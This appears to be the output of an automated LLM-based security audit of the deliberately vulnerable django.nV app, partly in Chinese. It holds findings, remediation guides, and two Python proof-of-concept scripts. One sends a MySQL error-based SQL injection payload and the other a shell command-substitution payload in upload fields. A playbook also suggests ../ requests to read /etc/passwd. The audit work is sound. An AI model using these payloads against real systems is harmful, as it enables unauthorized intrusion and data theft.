evidence.source: request.POST.get('name', False) at line 178 of views.py

exploit.verification_method: 发送带有注入payload的POST请求，检查响应中是否包含'AUDITAGENTX_RCE_1337'，若包含则证明注入成功。若响应为500错误且包含该字符串，同样视为成功。
exploit.impact: SQL注入漏洞可能导致数据库内容泄露、进一步权限提升或数据篡改。

static_evidence_chain.source_code:
curs.execute(
                "insert into taskManager_file ('name','path','project_id') values ('%s','%s',%s)" %
                (name, upload_path, project_id))

verification_checks: Confirm the user-controlled value is concatenated or joined into a filesystem path.
Check whether the code canonicalizes the path (realpath/abspath) and enforces an allowlisted base directory.
If a local target runs, send ../ or encoded ..%2f payloads for a known file (app config, /etc/passwd) and look for file contents in the response.
If no target exists, record dynamic_verdict=not_executed instead of not_reproduced.
false_positive_signals: The resolved path is validated to stay under an allowlisted base directory.
The filename is a fixed server-side constant or comes from a strict allowlist.
The framework normalizes and rejects traversal sequences before use.
remediation: Canonicalize the path and confirm it stays under an allowlisted base directory.
Reject traversal sequences and use safe file APIs.

security_knowledge.title: Path Traversal Verification Playbook
security_knowledge.summary: Verify path traversal by confirming attacker-controlled input reaches a filesystem API without canonicalization or a base-directory allowlist.
verification_checks: Confirm the user-controlled value is concatenated or joined into a filesystem path.
Check whether the code canonicalizes the path (realpath/abspath) and enforces an allowlisted base directory.
If a local target runs, send ../ or encoded ..%2f payloads for a known file (app config, /etc/passwd) and look for file contents in the response.
If no target exists, record dynamic_verdict=not_executed instead of not_reproduced.
false_positive_signals: The resolved path is validated to stay under an allowlisted base directory.
The filename is a fixed server-side constant or comes from a strict allowlist.
The framework normalizes and rejects traversal sequences before use.
remediation: Canonicalize the path and confirm it stays under an allowlisted base directory.
Reject traversal sequences and use safe file APIs.

security_knowledge.title: SQL Injection
security_knowledge.summary: Externally influenced input is used to construct SQL without sufficient separation between data and query structure.
verification_checks: Confirm user-controlled input reaches SQL construction or execution.
Confirm the query is built with string concatenation, interpolation, or formatting.
Confirm no prepared statement, parameter binding, or strong type conversion separates data from SQL.
false_positive_signals: The sink uses parameter placeholders with a separate parameter tuple/list.
The value is converted to a strict numeric type before reaching SQL.
The SQL statement is a static literal and user input is not interpolated.
remediation: Use prepared statements or parameterized queries.
Do not concatenate user-controlled strings into SQL.
Run database users with least privilege and avoid detailed SQL errors in responses.

security_knowledge.title: Insecure Deserialization
security_knowledge.summary: Untrusted data is deserialized without validation, allowing object injection or remote code execution.
owasp: A08:2021 Software and Data Integrity Failures
verification_checks: Confirm untrusted input is passed to a deserialization sink.
Confirm the deserializer can instantiate arbitrary classes or call __reduce__.
Confirm no integrity check (HMAC/signature) protects the serialized blob.
false_positive_signals: Only json.loads / yaml.safe_load is used on the untrusted data.
The serialized data is signed and verified before deserialization.
The input is a trusted, application-generated constant.
remediation: Prefer safe formats (JSON) and safe loaders (yaml.safe_load).
Never deserialize untrusted data with pickle/unserialize/ObjectInputStream.
If unavoidable, sign+verify payloads and restrict allowed classes.

call_path.detail: views.py:183: curs.execute( "insert into taskManager_file ('name','path','project_id') values ('%s','%s',%s)" % (name, upload_path, project_id))

exploit.exploit_path: HTTP POST parameter 'name' -> string formatting in cursor.execute() -> SQL injection on INSERT statement
exploit.attack_vector: HTTP POST request with malicious 'name' parameter
exploit.exploit_code:
import requests

# Target URL - modify as needed
url = "http://localhost:5000/taskManager/upload"  # Example endpoint, adjust path

# Payload for MySQL error-based injection
name_payload = "' OR updatexml(1,concat(0x7e,(select 'AUDITAGENTX_RCE_1337')),1) OR '1'='1"

# Other required parameters (adjust names as per actual form)
data = {
    "name": name_payload,
    "path": "/dummy",
    "project_id": "1"
}

try:
    response = requests.post(url, data=data, timeout=10)
    print("Response:")
    print(response.text)
except Exception as e:
    print(f"Error: {e}")
exploit.verification_method: Send the malicious payload via POST request and examine the response for the error message containing 'AUDITAGENTX_RCE_1337'.
exploit.impact: SQL injection could lead to unauthorized data access, modification, or deletion.

false_positive_signals: Only json.loads / yaml.safe_load is used on the untrusted data.
The serialized data is signed and verified before deserialization.
The input is a trusted, application-generated constant.
remediation: Prefer safe formats (JSON) and safe loaders (yaml.safe_load).
Never deserialize untrusted data with pickle/unserialize/ObjectInputStream.
If unavoidable, sign+verify payloads and restrict allowed classes.

evidence.source: title (user-controlled parameter from HTTP request, e.g., form or query string)

exploit.exploit_path: User-controlled 'title' parameter in HTTP upload request -> os.system() call with shell command injection
exploit.attack_vector: HTTP POST request with file upload, 'title' parameter containing shell command substitution
exploit.exploit_code:
import requests

BASE_URL = "http://localhost:8000"
upload_url = f"{BASE_URL}/upload/"

# Create a harmless file to upload
files = {"file": ("test.txt", b"This is a test file.")}
# Payload: command substitution to create a file with name AUDITAGENTX_RCE_1337
data = {"title": "$(echo AUDITAGENTX_RCE_1337)"}

response = requests.post(upload_url, files=files, data=data)
print("Response status:", response.status_code)
print("Response text:", response.text)

# Check if the marker filename appears in response
if "AUDITAGENTX_RCE_1337" in response.text:
    print("Exploit succeeded: marker found in response.")
else:
    print("Check upload directory for file named 'AUDITAGENTX_RCE_1337'")
exploit.verification_method: After sending the exploit request, check if the server response contains the marker string 'AUDITAGENTX_RCE_1337' (indicating command output was reflected), or manually verify by accessing the upload directory and looking for a file named 'AUDITAGENTX_RCE_1337'.
exploit.impact: Remote Code Execution (RCE) with the privileges of the web server, allowing arbitrary command execution.

top_result.title: OS Command Injection
false_positive_signals: The sink receives only static strings.
The input is selected from a strict allowlist of fixed values.

result_summary.reason: No type-specific local verifier matched this finding.

verification_checks: Confirm user input controls a filesystem path or filename.
Confirm canonical path checks do not enforce an allowed base directory.
Confirm traversal markers or absolute paths can influence the final path.
false_positive_signals: Path is resolved and checked to remain inside an allowed base directory.
Only fixed file IDs are accepted and mapped server-side.
The filename is reduced to basename and extension allowlisted.
remediation: Map user-visible IDs to server-side file paths.
Canonicalize and enforce an allowed base directory.
Reject absolute paths, traversal markers, and unexpected extensions.

security_knowledge.title: Path Traversal
security_knowledge.summary: User-controlled path components can escape an intended directory and access unauthorized files.
verification_checks: Confirm user input controls a filesystem path or filename.
Confirm canonical path checks do not enforce an allowed base directory.
Confirm traversal markers or absolute paths can influence the final path.

remediation: Map user-visible IDs to server-side file paths.
Canonicalize and enforce an allowed base directory.
Reject absolute paths, traversal markers, and unexpected extensions.

security_knowledge.title: Command Injection Remediation Guide
security_knowledge.summary: Avoid shell execution for user-controlled data; use safe APIs, argument arrays, allowlists, and sandboxing.
verification_checks: Confirm the fix removes shell=True or untrusted command string construction.
false_positive_signals: The command is already executed as a fixed argument array with shell=False.
remediation: Prefer language/library APIs over external process execution.
Pass arguments as arrays and keep shell=False.
Use strict allowlists for any remaining user-controlled arguments.

security_knowledge.title: OS Command Injection
security_knowledge.summary: Externally influenced input is used to construct an OS command without neutralizing shell metacharacters or separating arguments.
verification_checks: Confirm attacker-controlled input reaches a command execution sink.
Confirm a shell string is built from user input or shell=True is used.
Confirm input validation or argument separation does not remove command metacharacter impact.
false_positive_signals: subprocess is called with a fixed executable and an argument array without shell=True.
The input is selected from a strict allowlist of fixed values.
The sink receives only static strings.
remediation: Prefer library APIs over shell commands.
Use argument arrays with shell=False.
Apply strict allowlists and run command execution in a sandbox with least privilege.

summary.executive_summary: 本次审计对象为 django.nV，来源为 https://github.com/nVisium/django.nV，项目主要语言为 Python、JavaScript、Shell，框架识别结果为 Django，共解析 79 个文件、16751 行代码。AuditAgentX 的流程先由 RepoParserAgent 建立项目画像，再由 StaticScanAgent 调用静态规则和 SAST 工具产生候选漏洞，AuditAgent 补充语义层面的风险发现，VerifyAgent 独立复核并过滤误报，随后 ExploitAgent/DynamicVerifier 对可验证漏洞生成授权 PoC 并保存运行证据，最后由 SummaryAgent 汇总为本报告。当前共发现 87 条风险，其中 Critical 0 条、High 3 条、Medium 66 条、Low 18 条；静态分析覆盖 87 条，动态验证覆盖 3 条，其中 0 条已复现。主要风险类型集中在 Command Injection(15)、django-using-request-post-after-is-valid(11)、XSS(10)、detect-non-literal-regexp(9)，总体风险评级为 HIGH。
summary.static_summary: 静态分析阶段合并 SAST 工具、硬编码密钥检测和自定义规则结果，共形成 87 条静态风险。主要来源分布为 semgrep(47)、custom-taint(35)、bandit(5)。这些结果先作为候选项进入 VerifyAgent，避免仅凭规则命中直接下结论。
summary.dynamic_summary: 动态验证阶段对 3 条漏洞保存了运行证据，其中 0 条具备可复现结果。报告中的 Source、Sink、调用路径、PoC 和 runtime 证据共同构成证据链。
workflow_summary: RepoParserAgent：解析仓库结构、语言、框架、入口文件、依赖与代码规模，为后续审计提供项目画像。
StaticScanAgent：调用 Semgrep、Gitleaks、自定义规则等工具进行静态扫描，产出 SQL 注入、命令注入、路径遍历、硬编码密钥等候选风险。
AuditAgent：基于 LLM 对代码上下文做语义审计，补充传统 SAST 工具可能漏掉的业务逻辑与调用链风险。
VerifyAgent：独立复核候选漏洞，调用本地代码上下文读取、启发式分析和 SAST replay 工具过滤误报。
ExploitAgent / DynamicVerifier：为已确认漏洞生成授权 PoC、触发路径和利用代码，并在本地靶场或授权目标上保存动态验证证据。
SummaryAgent：汇总项目概况、静态/动态结果、证据链和修复优先级，生成执行摘要与修改建议。

remediation_plan.title: 优先修复 Critical/High 漏洞
remediation_plan.detail: 先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。

remediation_plan.title: 按漏洞类型批量治理
remediation_plan.detail: 对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。

remediation_plan.title: 补充动态验证覆盖
remediation_plan.detail: 为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。

remediation_plan.title: 纳入持续审计流程
remediation_plan.detail: 将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。

summary.conclusion: 综合项目规模、漏洞数量、严重等级和验证结果，当前项目处于 HIGH 风险水平。建议先处理已确认的高危/可复现漏洞，再统一治理同类输入校验、权限控制、敏感信息管理和依赖安全问题。
